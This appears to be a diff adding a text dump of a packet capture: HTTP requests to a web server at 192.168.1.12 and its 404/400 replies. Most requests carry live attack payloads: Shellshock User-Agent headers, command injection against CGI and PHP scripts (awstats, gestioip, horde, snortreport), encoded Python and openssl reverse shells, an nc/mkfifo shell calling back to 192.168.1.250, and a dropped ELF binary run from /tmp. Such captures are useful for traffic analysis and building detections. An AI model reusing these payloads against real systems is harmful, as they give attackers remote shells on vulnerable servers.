@@ -1,0 +1,549 @@
+Packet: [1m[33mLayer HTTP
+:[0m[1m	GET /cgi-bin/ping.sh HTTP/1.1\r\n
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI:[0m[1m /cgi-bin/ping.sh
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	 […]User-Agent:[0m[1m () { :;}; $(/bin/echo -ne '\x73\x68\x20\x2d\x63\x20\x27\x28\x73\x6c\x65\x65\x70\x20\x33\x38\x36\x32\x7c\x6f\x70\x65\x6e\x73\x73\x6c\x20\x73\x5f\x63\x6c\x69\x65\x6e\x74\x20\x2d\x71\x75\x69\x65\x74\x20\x2d\x63\x6f\x6e\x6e\x
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/cgi-bin/ping.sh
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	 […]GET /cgi-bin/;echo${IFS}-ne${IFS}"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b\x6f\x6c\x65\x64\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x35\x30\x20\x33\x30\x30\x35\x38\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x6
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /cgi-bin/;echo${IFS}-ne${IFS}"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b\x6f\x6c\x65\x64\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x35\x30\x20\x33\x30\x30\x35\x38\x20\x30\x3c\x2f\x74\x6d\x
+[0m[1m[32m	Request URI Path […]:[0m[1m /cgi-bin/;echo${IFS}-ne${IFS}"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b\x6f\x6c\x65\x64\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x35\x30\x20\x33\x30\x30\x35\x38\x20\x30\x3c\x2f\x74\
+[0m[1m[32m	Request URI Path Segment:[0m[1m /cgi-bin/
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/cgi-bin/;echo${IFS}-ne${IFS}"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b\x6f\x6c\x65\x64\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x35\x30\x20\x33\x30\x30\x35\x38\x
+[0m[1m	\r\n
+[0m[1m[32m	Request URI Path Segment:[0m[1m echo
+[0m[1m[32m	Request URI Path Segment:[0m[1m {IFS}-ne
+[0m[1m[32m	Request URI Path Segment […]:[0m[1m {IFS}"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b\x6f\x6c\x65\x64\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x35\x30\x20\x33\x30\x30\x35\x38\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x6b\
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 400 Bad Request\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 400
+[0m[1m[32m	Status Code Description:[0m[1m Bad Request
+[0m[1m[32m	Response Phrase:[0m[1m Bad Request
+[0m[1m[32m	Content-Type:[0m[1m text/html; charset=us-ascii\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-HTTPAPI/2.0\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 20:58:44 GMT\r\n
+[0m[1m[32m	Connection:[0m[1m close\r\n
+[0m[1m[32m	Content-Length:[0m[1m 324\r\n
+[0m[1m[32m	Content length:[0m[1m 324
+[0m[1m[32m	Request in frame:[0m[1m 1026
+[0m[1m[32m	Time since request:[0m[1m 0.001102000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /cgi-bin/;echo${IFS}-ne${IFS}"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b\x6f\x6c\x65\x64\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x35\x30\x20\x33\x30\x30\x35\x38\x20\x30\x3c\x2f\x74\x6d\x
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/cgi-bin/;echo${IFS}-ne${IFS}"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b\x6f\x6c\x65\x64\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x35\x30\x20\x33\x30\x30\x35\x38\x
+[0m[1m[32m	File Data:[0m[1m 324 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	GET /cgi-bin/webcm?var%3alang=%26echo%20-e%20%22\n\nqvcQoVSMP%22 HTTP/1.1\r\n
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI:[0m[1m /cgi-bin/webcm?var%3alang=%26echo%20-e%20%22\n\nqvcQoVSMP%22
+[0m[1m[32m	Request URI Path:[0m[1m /cgi-bin/webcm
+[0m[1m[32m	Request URI Query:[0m[1m var%3alang=%26echo%20-e%20%22\n\nqvcQoVSMP%22
+[0m[1m[32m	Request URI Query Parameter:[0m[1m var%3alang=%26echo%20-e%20%22\n\nqvcQoVSMP%22
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/cgi-bin/webcm?var%3alang=%26echo%20-e%20%22\n\nqvcQoVSMP%22
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:00:36 GMT\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 3801
+[0m[1m[32m	Time since request:[0m[1m 0.001273000 seconds
+[0m[1m[32m	Request URI:[0m[1m /cgi-bin/webcm?var%3alang=%26echo%20-e%20%22\n\nqvcQoVSMP%22
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/cgi-bin/webcm?var%3alang=%26echo%20-e%20%22\n\nqvcQoVSMP%22
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	GET /shell?echo+PfCeqnh HTTP/1.1\r\n
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI:[0m[1m /shell?echo+PfCeqnh
+[0m[1m[32m	Request URI Path:[0m[1m /shell
+[0m[1m[32m	Request URI Query:[0m[1m echo+PfCeqnh
+[0m[1m[32m	Request URI Query Parameter:[0m[1m echo
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Connection:[0m[1m Keep-Alive\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/shell?echo+PfCeqnh
+[0m[1m	\r\n
+[0m[1m[32m	Request URI Query Parameter:[0m[1m PfCeqnh
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:02:28 GMT\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 11877
+[0m[1m[32m	Time since request:[0m[1m 0.001073000 seconds
+[0m[1m[32m	Request URI:[0m[1m /shell?echo+PfCeqnh
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/shell?echo+PfCeqnh
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	POST /cgi/close_window.cgi HTTP/1.1\r\n
+[0m[1m[32m	Request Method:[0m[1m POST
+[0m[1m[32m	Request URI:[0m[1m /cgi/close_window.cgi
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	 […]User-Agent:[0m[1m iRpsZhyHnhpdBqQU/bin/echo -ne '\x73\x68\x20\x2d\x63\x20\x27\x28\x73\x6c\x65\x65\x70\x20\x33\x36\x32\x31\x7c\x6f\x70\x65\x6e\x73\x73\x6c\x20\x73\x5f\x63\x6c\x69\x65\x6e\x74\x20\x2d\x71\x75\x69\x65\x74\x20\x2d\x63\x6f\x6e\x
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Content-Length:[0m[1m 145\r\n
+[0m[1m[32m	Content length:[0m[1m 145
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/cgi/close_window.cgi
+[0m[1m[32m	File Data:[0m[1m 145 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	GET / HTTP/1.1\r\n
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI:[0m[1m /
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	 […]User-Agent:[0m[1m () { :;};echo -e "\r\nAWfUkKKIytIXVMUNwaE3AoBuU4so4dHFj7kDddqnLu$(echo -en \\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x03\\x00\\x01\\x00\\x00\\x00\\x54\\x80\\x04\\x08\\x34\
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	GET / HTTP/1.1\r\n
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI:[0m[1m /
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m () { :;};echo -e "\r\nAWfUkKKIytIXVMUNwaE3AoBuU4so4dHFj7kDddqnLu$(/tmp/mKmMf)AWfUkKKIytIXVMUNwaE3AoBuU4so4dHFj7kDddqnLu"\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	 […]GET /fcms/dev/less.php?argv%5b1%5d=%7cecho%20GbhwWZyIu%3bpython%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zICAgOyAgICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgICAgcG9ydD0zMDQ1OCAgIDsgICAgICAgcz1zb
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /fcms/dev/less.php?argv%5b1%5d=%7cecho%20GbhwWZyIu%3bpython%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zICAgOyAgICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgICAgcG9ydD0zMDQ1OCAgIDsgICAg
+[0m[1m[32m	Request URI Path:[0m[1m /fcms/dev/less.php
+[0m[1m[32m	Request URI Query […]:[0m[1m argv%5b1%5d=%7cecho%20GbhwWZyIu%3bpython%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zICAgOyAgICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgICAgcG9ydD0zMDQ1OCAgIDsgICAgICAgcz1zb2NrZ
+[0m[1m[32m	Request URI Query Parameter […]:[0m[1m argv%5b1%5d=%7cecho%20GbhwWZyIu%3bpython%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zICAgOyAgICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgICAgcG9ydD0zMDQ1OCAgIDsgICAgICA
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/fcms/dev/less.php?argv%5b1%5d=%7cecho%20GbhwWZyIu%3bpython%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zICAgOyAgICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgICAg
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:04:34 GMT\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 14826
+[0m[1m[32m	Time since request:[0m[1m 0.001274000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /fcms/dev/less.php?argv%5b1%5d=%7cecho%20GbhwWZyIu%3bpython%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zICAgOyAgICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgICAgcG9ydD0zMDQ1OCAgIDsgICAg
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/fcms/dev/less.php?argv%5b1%5d=%7cecho%20GbhwWZyIu%3bpython%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zICAgOyAgICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgICAg
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m[32m	 […]GET /gestioip/ip_checkhost.cgi?ip=2607:[0m[1mf0d0:$(echo${IFS}bWtmaWZvIC90bXAvZWdub2k7IG5jIDE5Mi4xNjguMS4yNTAgMzA0NjMgMDwvdG1wL2Vnbm9pIHwgL2Jpbi9zaCA+L3RtcC9lZ25vaSAyPiYxOyBybSAvdG1wL2Vnbm9p|base64${IFS}--decode|tee${IFS}anfJzrYI&&sh${IFS}
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /gestioip/ip_checkhost.cgi?ip=2607:f0d0:$(echo${IFS}bWtmaWZvIC90bXAvZWdub2k7IG5jIDE5Mi4xNjguMS4yNTAgMzA0NjMgMDwvdG1wL2Vnbm9pIHwgL2Jpbi9zaCA+L3RtcC9lZ25vaSAyPiYxOyBybSAvdG1wL2Vnbm9p|base64${IFS}--decode|tee${IFS}anfJzrYI&
+[0m[1m[32m	Request URI Path:[0m[1m /gestioip/ip_checkhost.cgi
+[0m[1m[32m	Request URI Query […]:[0m[1m ip=2607:f0d0:$(echo${IFS}bWtmaWZvIC90bXAvZWdub2k7IG5jIDE5Mi4xNjguMS4yNTAgMzA0NjMgMDwvdG1wL2Vnbm9pIHwgL2Jpbi9zaCA+L3RtcC9lZ25vaSAyPiYxOyBybSAvdG1wL2Vnbm9p|base64${IFS}--decode|tee${IFS}anfJzrYI&&sh${IFS}anfJzrYI):00
+[0m[1m[32m	Request URI Query Parameter:[0m[1m ip=2607:f0d0:
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/gestioip/ip_checkhost.cgi?ip=2607:f0d0:$(echo${IFS}bWtmaWZvIC90bXAvZWdub2k7IG5jIDE5Mi4xNjguMS4yNTAgMzA0NjMgMDwvdG1wL2Vnbm9pIHwgL2Jpbi9zaCA+L3RtcC9lZ25vaSAyPiYxOyBybSAvdG1wL2Vnbm9p|base64${IFS}--d
+[0m[1m	\r\n
+[0m[1m[32m	Request URI Query Parameter:[0m[1m (echo
+[0m[1m[32m	Request URI Query Parameter:[0m[1m {IFS}bWtmaWZvIC90bXAvZWdub2k7IG5jIDE5Mi4xNjguMS4yNTAgMzA0NjMgMDwvdG1wL2Vnbm9pIHwgL2Jpbi9zaCA
+[0m[1m[32m	Request URI Query Parameter:[0m[1m L3RtcC9lZ25vaSAyPiYxOyBybSAvdG1wL2Vnbm9p|base64
+[0m[1m[32m	Request URI Query Parameter:[0m[1m {IFS}--decode|tee
+[0m[1m[32m	Request URI Query Parameter:[0m[1m {IFS}anfJzrYI
+[0m[1m[32m	Request URI Query Parameter:[0m[1m &sh
+[0m[1m[32m	Request URI Query Parameter:[0m[1m {IFS}anfJzrYI
+[0m[1m[32m	Request URI Query Parameter:[0m[1m :0000:0000:0000:0000:0004
+[0m[1m[32m	Request URI Query Parameter:[0m[1m hostname=fds
+[0m[1m[32m	Request URI Query Parameter:[0m[1m client_id=1
+[0m[1m[32m	Request URI Query Parameter:[0m[1m ip_version=
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:04:36 GMT\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 14857
+[0m[1m[32m	Time since request:[0m[1m 0.001296000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /gestioip/ip_checkhost.cgi?ip=2607:f0d0:$(echo${IFS}bWtmaWZvIC90bXAvZWdub2k7IG5jIDE5Mi4xNjguMS4yNTAgMzA0NjMgMDwvdG1wL2Vnbm9pIHwgL2Jpbi9zaCA+L3RtcC9lZ25vaSAyPiYxOyBybSAvdG1wL2Vnbm9p|base64${IFS}--decode|tee${IFS}anfJzrYI&
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/gestioip/ip_checkhost.cgi?ip=2607:f0d0:$(echo${IFS}bWtmaWZvIC90bXAvZWdub2k7IG5jIDE5Mi4xNjguMS4yNTAgMzA0NjMgMDwvdG1wL2Vnbm9pIHwgL2Jpbi9zaCA+L3RtcC9lZ25vaSAyPiYxOyBybSAvdG1wL2Vnbm9p|base64${IFS}--d
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	POST /horde/services/javascript.php HTTP/1.1\r\n
+[0m[1m[32m	Request Method:[0m[1m POST
+[0m[1m[32m	Request URI:[0m[1m /horde/services/javascript.php
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Cookie:[0m[1m href=passthru:echo igSpDk`mkfifo /tmp/ttrdiy; nc 192.168.1.250 30489 0</tmp/ttrdiy | /bin/sh >/tmp/ttrdiy 2>&1; rm /tmp/ttrdiy`igSpDk\r\n
+[0m[1m[32m	Cookie pair:[0m[1m href=passthru:echo igSpDk`mkfifo /tmp/ttrdiy
+[0m[1m[32m	Connection:[0m[1m Close\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Content-Length:[0m[1m 31\r\n
+[0m[1m[32m	Content length:[0m[1m 31
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/horde/services/javascript.php
+[0m[1m[32m	File Data:[0m[1m 31 bytes
+[0m[1m	\r\n
+[0m[1m[32m	Cookie pair:[0m[1m nc 192.168.1.250 30489 0</tmp/ttrdiy | /bin/sh >/tmp/ttrdiy 2>&1
+[0m[1m[32m	Cookie pair:[0m[1m rm /tmp/ttrdiy`igSpDk
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	 […]GET /snortreport-1.3.2/nmap.php?target=127.0.0.1%20%26%26%20echo%20XXXXX%20%26%26%20eval%20%24%28echo%20cHl0aG9uIC1jICJleGVjKCdhVzF3YjNKMElITnZZMnRsZENBZ0lDd2dJQ0FnYzNWaWNISnZZMlZ6Y3lBZ0lDd2dJQ0FnYjNNZ0lDQTdJQ0FnSUNBZ0lDQm9iM04wUFNJe
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /snortreport-1.3.2/nmap.php?target=127.0.0.1%20%26%26%20echo%20XXXXX%20%26%26%20eval%20%24%28echo%20cHl0aG9uIC1jICJleGVjKCdhVzF3YjNKMElITnZZMnRsZENBZ0lDd2dJQ0FnYzNWaWNISnZZMlZ6Y3lBZ0lDd2dJQ0FnYjNNZ0lDQTdJQ0FnSUNBZ0lDQm9i
+[0m[1m[32m	Request URI Path:[0m[1m /snortreport-1.3.2/nmap.php
+[0m[1m[32m	Request URI Query […]:[0m[1m target=127.0.0.1%20%26%26%20echo%20XXXXX%20%26%26%20eval%20%24%28echo%20cHl0aG9uIC1jICJleGVjKCdhVzF3YjNKMElITnZZMnRsZENBZ0lDd2dJQ0FnYzNWaWNISnZZMlZ6Y3lBZ0lDd2dJQ0FnYjNNZ0lDQTdJQ0FnSUNBZ0lDQm9iM04wUFNJeE9USXVNVFk0TG
+[0m[1m[32m	Request URI Query Parameter […]:[0m[1m target=127.0.0.1%20%26%26%20echo%20XXXXX%20%26%26%20eval%20%24%28echo%20cHl0aG9uIC1jICJleGVjKCdhVzF3YjNKMElITnZZMnRsZENBZ0lDd2dJQ0FnYzNWaWNISnZZMlZ6Y3lBZ0lDd2dJQ0FnYjNNZ0lDQTdJQ0FnSUNBZ0lDQm9iM04wUFNJeE9U
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/snortreport-1.3.2/nmap.php?target=127.0.0.1%20%26%26%20echo%20XXXXX%20%26%26%20eval%20%24%28echo%20cHl0aG9uIC1jICJleGVjKCdhVzF3YjNKMElITnZZMnRsZENBZ0lDd2dJQ0FnYzNWaWNISnZZMlZ6Y3lBZ0lDd2dJQ0FnYjNN
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:07:25 GMT\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 16940
+[0m[1m[32m	Time since request:[0m[1m 0.001395000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /snortreport-1.3.2/nmap.php?target=127.0.0.1%20%26%26%20echo%20XXXXX%20%26%26%20eval%20%24%28echo%20cHl0aG9uIC1jICJleGVjKCdhVzF3YjNKMElITnZZMnRsZENBZ0lDd2dJQ0FnYzNWaWNISnZZMlZ6Y3lBZ0lDd2dJQ0FnYjNNZ0lDQTdJQ0FnSUNBZ0lDQm9i
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/snortreport-1.3.2/nmap.php?target=127.0.0.1%20%26%26%20echo%20XXXXX%20%26%26%20eval%20%24%28echo%20cHl0aG9uIC1jICJleGVjKCdhVzF3YjNKMElITnZZMnRsZENBZ0lDd2dJQ0FnYzNWaWNISnZZMlZ6Y3lBZ0lDd2dJQ0FnYjNN
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	 […]GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICAgc3VicHJvY2VzcyAgICAgICAgICwgICAgICAgb3MgOyAgICAgIGhvc3Q9IjE5Mi4xNjguMS4yNTAiIDsgICAgICBwb3J0PTMwOTI4IDsgICAgICBzPXN
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICAgc3VicHJvY2VzcyAgICAgICAgICwgICAgICAgb3MgOyAgICAgIGhvc3Q9IjE5Mi4xNjguMS4yNTAiIDsgICAgICBwb3J0PTMwOTI4IDsgIC
+[0m[1m[32m	Request URI Path:[0m[1m /cgi-bin/awstats.pl
+[0m[1m[32m	Request URI Query […]:[0m[1m configdir=|echo;echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICAgc3VicHJvY2VzcyAgICAgICAgICwgICAgICAgb3MgOyAgICAgIGhvc3Q9IjE5Mi4xNjguMS4yNTAiIDsgICAgICBwb3J0PTMwOTI4IDsgICAgICBzPXNvY2tl
+[0m[1m[32m	Request URI Query Parameter:[0m[1m configdir=|echo
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
